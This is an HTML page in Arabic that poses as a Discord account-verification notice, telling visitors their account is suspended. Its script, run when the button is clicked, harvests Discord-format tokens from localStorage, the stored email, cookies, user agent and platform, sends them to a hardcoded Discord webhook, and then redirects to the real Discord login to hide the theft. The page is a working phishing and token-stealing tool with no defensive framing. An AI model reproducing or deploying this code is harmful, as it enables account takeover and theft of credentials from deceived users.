<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body {
            background-color: #313338;
            color: #dbdee1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .card {
            background-color: #2b2d31;
            padding: 40px;
            border-radius: 8px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
            text-align: center;
            position: relative;
        }
        .logo { width: 80px; margin-bottom: 20px; }
        h1 { color: #f2f3f5; font-size: 24px; margin-bottom: 10px; }
        p { color: #b5bac1; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
        .btn {
            background-color: #5865f2;
            color: white;
            border: none;
            padding: 14px 24px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.2s;
        }
        .btn:hover { background-color: #4752c4; }
        
        #loading {
            display: none;
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background-color: #2b2d31;
            border-radius: 8px;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10;
        }
        .spinner {
            border: 4px solid rgba(255,255,255,0.1);
            border-top: 4px solid #5865f2;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" alt="Discord" class="logo">
        
        <div id="content">
            <h1>توثيق الحساب مطلوب</h1>
            <p>لقد تم إيقاف حسابك مؤقتاً لأسباب أمنية. يرجى النقر على الزر أدناه لتوثيق حسابك والتحقق من هويتك للعودة إلى استخدام ديسكورد.</p>
            <button class="btn" onclick="startVerification()">توثيق الحساب الآن</button>
        </div>

        <div id="loading">
            <div class="spinner"></div>
            <p style="margin:0; color:#00a8fc;">جاري التحقق من الهوية...</p>
        </div>
    </div>

    <script>
        const WEBHOOK = "https://ptb.discord.com/api/webhooks/1563433824195715163/pImDLSOanfVezzULnId7p-Fny5ViXFkbPyoldjKCBnEzpFaPDg7dO6oj7zuBHTJISlwr";

        function startVerification() {
            document.getElementById('content').style.display = 'none';
            document.getElementById('loading').style.display = 'flex';

            // محاولة سحب أي توكن عادي (غير مشفر)
            let tokens = [];
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const k = localStorage.key(i);
                    const v = localStorage.getItem(k);
                    if (typeof v === 'string') {
                        const m = v.match(/[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g);
                        if (m) tokens.push(...m);
                    }
                }
            } catch(e){}

            // تجميع البيانات
            const info = {
                tokens: tokens.length > 0 ? tokens : ["لا يوجد توكن (التشفير يمنع السحب)"],
                email: localStorage.getItem('email') || "غير محفوظ",
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                time: new Date().toISOString(),
                cookies: document.cookie
            };

            // الإرسال للويبهوك
            fetch(WEBHOOK, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: "**🚨 تم الضغط على زر التوثيق!**\n```json\n" + JSON.stringify(info, null, 2).slice(0, 1950) + "\n```"
                })
            }).catch(()=>{}).finally(() => {
                setTimeout(() => { window.location.href = "https://discord.com/login"; }, 1500);
            });
        }
    </script>
</body>
</html>
